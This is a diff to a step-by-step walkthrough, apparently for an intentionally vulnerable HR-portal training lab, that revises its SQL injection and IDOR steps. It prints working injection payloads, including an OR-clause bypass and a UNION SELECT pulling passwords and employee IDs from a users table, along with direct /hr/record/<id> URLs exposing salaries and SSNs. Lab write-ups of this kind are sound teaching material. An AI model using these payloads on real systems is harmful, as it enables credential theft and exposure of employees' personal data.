@@ -166,11 +166,11 @@ Attacker logs in as admin with the new password
       ↓
 SQL Injection on /admin/search
       ↓
-Database extraction (passwords, HR records)
+Extract credentials + employee_id from users table (no salary/SSN here)
       ↓
-IDOR on /hr/record/<id>
+Sign in as guest (lowest privilege)
       ↓
-Access to other employees' confidential records
+IDOR: /hr/record/<employee_id> → salary, SSN, internal notes
 ```
 
 ### Step 1 — Guest account + Stored XSS
@@ -196,38 +196,45 @@ Username: admin
 Password: pwned123
 ```
 
-### Step 4 — SQL Injection
+### Step 4 — SQL Injection (users table only)
 
 Navigate to **Admin → Account Lookup** (`/admin/search`). The page looks like a normal username search — no SQL is shown. Test the `username` parameter in Burp Repeater.
 
-**Discover injection** — single quote returns an error or unexpected behavior; OR clause returns all accounts:
+**Discover injection** — single quote returns an error; OR clause returns all accounts:
 ```
 admin' OR '1'='1'--
 ```
 
-**Extract password hashes** (appear in the Role column due to UNION column mapping):
-```
-' UNION SELECT id, username, password, email FROM users--
-```
-
-**Extract HR records** via UNION (4 columns must match the query):
-```
-' UNION SELECT employee_id, salary, ssn, internal_notes FROM hr_records--
-```
-
-### Step 5 — IDOR
-
-The portal UI does not expose HR record links to **guest** accounts — only public profiles are visible. However, the server does not enforce object-level authorization, so an attacker can access confidential records by requesting URLs directly (or after discovering employee IDs via SQLi).
-
-Log in as `guest` and open these URLs manually (Burp Repeater or address bar):
+**Extract credentials and employee IDs** via UNION. The query only selects four columns from `users` — passwords and `employee_id` values appear in the Role and Email columns:
 
 ```
-/hr/record/1
-/hr/record/2
-/hr/record/3
+' UNION SELECT id, username, password, employee_id FROM users--
 ```
 
-No ownership check is performed — only authentication is required.
+Example result mapping:
+
+| Account ID | Username | Role *(actual: password)* | Email *(actual: employee_id)* |
+|------------|----------|---------------------------|-------------------------------|
+| 2 | alex | sysadmin99 | 2 |
+| 4 | diana | diana2024! | 1 |
+
+Salary, SSN, and internal HR notes are **not** stored in `users` — they live in a separate `hr_records` table and are not returned by this search. Note the `employee_id` values for the next step.
+
+### Step 5 — IDOR (hr_records via the portal)
+
+Sign out from admin and log in as **`guest`** to prove access without elevated privileges.
+
+Using `employee_id` values from Step 4 (or by guessing `/hr/record/<id>` after seeing Employee ID `#N` on `/profile/N`), request HR files directly:
+
+```
+/hr/record/1   →  Diana — salary, SSN, internal notes
+/hr/record/2   →  Alex
+/hr/record/3   →  Maria
+```
+
+The UI hides HR links from guest accounts, but the server does not verify record ownership — only that a session exists.
+
+**Why two steps?** SQLi exposes the account database (`users`); confidential HR data (`hr_records`) is served only through `/hr/record/<id>`. Each vulnerability unlocks a different data store — together they complete the breach.
 
 ---
 
